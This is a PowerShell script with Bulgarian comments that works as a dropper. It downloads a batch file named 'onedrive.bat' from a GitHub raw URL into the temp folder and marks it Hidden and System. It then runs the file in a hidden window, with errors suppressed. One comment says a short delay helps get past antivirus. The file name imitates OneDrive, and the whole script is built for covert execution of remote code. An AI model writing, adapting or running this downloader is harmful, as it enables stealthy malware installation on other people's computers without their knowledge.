# =============================================================================
# Почистен и подобрен вариант – без самоповишаване на права
# =============================================================================

# Скриптът предполага, че се изпълнява с нужните права
# Ако няма права – просто няма да може да скрие файла или да го стартира с определени привилегии

$ErrorActionPreference = "SilentlyContinue"

# Път до файла (в temp – стандартно място)
$batFile = "$env:TEMP\onedrive.bat"
$url      = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"

# 1. Изтриваме стара версия, ако съществува
if (Test-Path $batFile) {
    Remove-Item $batFile -Force
}

# Малко изчакване – понякога помага при антивирус/защитни механизми
Start-Sleep -Milliseconds 600

# 2. Изтегляме файла
try {
    Invoke-WebRequest -Uri $url -OutFile $batFile -UseBasicParsing -TimeoutSec 15
}
catch {
    # Ако нещо се обърка – тихо излизаме (или можеш да сложиш Write-Host / лог)
    exit 1
}

# 3. Проверяваме дали файлът е изтеглен успешно
if (-not (Test-Path $batFile)) {
    # Можеш да добавиш съобщение, ако искаш обратна връзка
    # Write-Host "Не успях да изтегля файла." -ForegroundColor Red
    exit 1
}

# 4. Скриване на файла (Hidden + System)
try {
    $item = Get-Item $batFile -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
}
catch {
    # Ако не може да сложи атрибути – продължаваме все пак
}

# 5. Стартираме файла скрито
Start-Process -FilePath $batFile -WindowStyle Hidden -NoNewWindow

# Опционално – малко визуално потвърждение (махни ако не ти трябва)
# Write-Host "Стартирано." -ForegroundColor Green

# Край
exit 0
